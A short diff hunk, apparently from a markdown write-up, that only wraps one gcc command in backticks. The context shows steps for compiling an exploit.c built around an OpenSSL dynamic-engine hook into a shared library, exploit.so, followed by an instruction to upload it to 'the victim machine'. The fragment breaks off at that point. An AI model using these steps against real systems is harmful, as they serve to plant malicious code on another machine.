@@ -16,7 +16,7 @@ IMPLEMENT_DYNAMIC_CHECK_FN()
 ```
 
 Then execute 2 commands:
-gcc -fPIC -o exploit.o -c exploit.c
+`gcc -fPIC -o exploit.o -c exploit.c`
 gcc -shared -o exploit.so -lcrypto exploit.o
 
 Upload exploit.so to the victim machine then run:
